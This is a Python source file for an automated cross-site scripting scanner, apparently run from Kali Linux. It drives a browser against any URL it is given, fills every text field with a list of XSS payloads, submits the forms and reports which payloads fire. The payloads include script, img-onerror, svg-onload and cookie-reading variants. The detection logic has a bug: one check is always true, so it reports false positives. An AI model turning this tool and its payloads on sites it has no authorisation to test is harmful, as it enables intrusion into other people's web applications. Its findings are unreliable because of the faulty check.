import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import sys
import json
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service 
from bs4 import BeautifulSoup
import re

# Kết quả trả về url có nguy cơ bị XSS

def get_all_forms_response(url):
    try:
        chrome_path = r'/home/kali/Downloads/chromedriver-linux64/chromedriver'
        service = Service(chrome_path)  
        driver = webdriver.Chrome(service=service)
        driver.get(url)

        time.sleep(5)
        listScripts=[]
        html = driver.page_source
        soup = BeautifulSoup(html, 'html.parser')
        links = soup.find_all('form')
        scripts = driver.find_elements(By.TAG_NAME, "script")
        for i, script in enumerate(scripts):
            script_content = script.get_attribute('innerHTML')
            listScripts.append(script_content)

        driver.quit()
        return [links, listScripts]
    except Exception as e:
        print("[-] Get form Error!!!!!!!!!!",e)
        sys.stdout.flush()


def get_form_details_response(form):
    details = {}

    action = form.attrs.get("action", "").lower()

    method = form.attrs.get("method", "get").lower()

    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def get_form_details_scripts_response(script_content):
    try:
        if(script_content is not None):
            details = {}
            url_pattern = r"fetch\('(.+?)'"
            url_match = re.search(url_pattern, script_content)
            url = url_match.group(1) if url_match else None

         
            method_pattern = r"method: '(.+?)'"
            method_match = re.search(method_pattern, script_content)
            method = method_match.group(1) if method_match else None
            if (method is not None and url is not None ):
                details["url"]=url           
                details["method"]=method.lower()
                return details
            else:
                return None
        else:
            return None
    except Exception as e:
        print("Error ", e) 

def submit_form_response(form_details, url, value, scrip_details):
    try:
        target_url = urljoin(url, form_details["action"])
        # get the inputs
        inputs = form_details["inputs"]
        data = {}
        for input in inputs:
            if input["type"] == "text" or input["type"] == "search":
                input["value"] = value
            input_name = input.get("name")
            input_value = input.get("value")
            if input_name and input_value:
                data[input_name] = input_value
        if scrip_details is not None:
            if scrip_details["method"] == "post":
                return requests.post(scrip_details['url'], data=data)
            else:
                return requests.get(scrip_details['url'], params=data)
        else:
            if form_details["method"] == "post":
                return requests.post(target_url, data=data)
            else:
                return requests.get(target_url, params=data)
    except Exception as e:
        print("[-] Error", e)

def scan_xss_response(url):
    try:
        forms = get_all_forms_response(url)
        print(f"[+] Detected {len(forms[0])} forms on {url}.")
        sys.stdout.flush()
        js_script = "<script>alert(\"XSS\")</script>"
        # returning value
        is_vulnerable = False
        for form in forms[0]:
            form_details = get_form_details_response(form)
            print(f"[+] Submitting malicious payload to {url}")
            content = submit_form_response(form_details, url, js_script,None).content.decode()
            if js_script in content:
                print(f"[+] Detected XSS on {url}")
                print("[+] Form details:",form_details)
                sys.stdout.flush()
                is_vulnerable = True
            if(is_vulnerable is True):
                continue
            for script in forms[1]:
                script_details = get_form_details_scripts_response(script)
                if(script_details is None):
                    continue  
                contentScrip = submit_form_response(form_details, url, js_script, script_details).content.decode()
                if js_script.count(js_script) > 0:
                    print(f"[+] Detected XSS on {url}")
                    print("[+] Form details:",form_details)
                    sys.stdout.flush()
                    is_vulnerable = True
        if(is_vulnerable==False):
            print(f"[-] Not Found Xss on {url}")
            sys.stdout.flush()



    except Exception as e:
        print("[-] Error not Found")
        sys.stdout.flush()
        sys.stdout.flush()

def process_json_input(json_string):
    try:
        # Phân tích chuỗi JSON thành một đối tượng Python
        data = json.loads(json_string)
        # Trả về đối tượng đã được phân tích
        return data
    except json.JSONDecodeError as e:
        # Xử lý trường hợp nếu chuỗi JSON không hợp lệ
        print("[-] Invalid JSON format:", e)
        sys.stdout.flush()
        return None


# Kết quả trả về những payload tác động XSS đến Url

def get_all_forms(url):
    """
    Tải trang và trả về tất cả các form và script trên trang.
    """
    try:
        chrome_path = r'/home/kali/Downloads/chromedriver-linux64/chromedriver'
        service = Service(chrome_path)  
        driver = webdriver.Chrome(service=service)
        driver.get(url)
        # Chờ 5 giây để trang web tải hoàn chỉnh
        time.sleep(5)
        html = driver.page_source
        soup = bs(html, 'html.parser')
        forms = soup.find_all('form')
        return forms, driver
    except Exception as e:
        print("[-] Error getting forms:", e)
        sys.stdout.flush()
        return [], [], None
    

def submit_form_New(driver, js_script):
    try:
        time.sleep(5)
        form_elements = driver.find_elements(By.XPATH, "//form")
        for form in form_elements:
            inputs = form.find_elements(By.TAG_NAME, "input")
            for input_tag in inputs:
                input_type = input_tag.get_attribute("type")
                input_name = input_tag.get_attribute("name")
                if input_type == "text" or input_type == "search":
                    input_tag.send_keys(js_script)  
            form.submit()  
            time.sleep(10)  
            try:
                WebDriverWait(driver, 10).until(EC.alert_is_present())
                alert = Alert(driver)
                alert_text = alert.text
                alert.accept()  
                return True
            except Exception as e:
                return None
    except Exception as e:
        return None
      
def scan_xss(url):
    try:
        js_scripts = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '"><img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<body onload=alert("XSS")>',
            '"><svg/onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\');">',
            '\'"--><script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '"><svg/onload=alert(1)>',
            '"><svg/onload=alert(1)>',
            '\'><svg/onload=alert(1)>',
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            '\'><img src=x onerror=alert(1)>',
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//--></script>",
            "<Script>alert('XSS')</scripT>",
            "<script>alert(document.cookie)</script>",
        ]
        isLen=True
        is_vulnerable = False
        for js_script in js_scripts:
            forms, driver = get_all_forms(url)
            if not driver:
                print("[-] Failed to initialize WebDriver.")
                sys.stdout.flush()
                return
            if (isLen is True):
                print(f"[+] Detected {len(forms)} forms on {url}.")
                sys.stdout.flush()
                isLen=False
            status=submit_form_New(driver, js_script)
            if status is True:
                print(f"[+] Detected Xss on {url} By Script [+] {js_script} [+]")
                sys.stdout.flush()
                is_vulnerable=True
                break
            else :
                print(f"[-] Not Found Xss on {url} By Script [ {js_script} ]")
                sys.stdout.flush()
        if not is_vulnerable:
            print(f"[-] Not Found XSS on {url}")
            sys.stdout.flush()
    except Exception as e:
        print("[-] Error scanning XSS:", e)
        sys.stdout.flush()
    finally:
        if driver:
            driver.quit()


if __name__ == "__main__":    
    json_string = sys.stdin.readline()
    data = process_json_input(json_string)
    if(data['type']=='payload'):
        print("Loading Scanning Xss with Payload ..............")
        sys.stdout.flush()
        scan_xss(data['url'])
    else:
        print("Loading Scanning Xss with Response.............")
        sys.stdout.flush()
        scan_xss_response(data['url'])


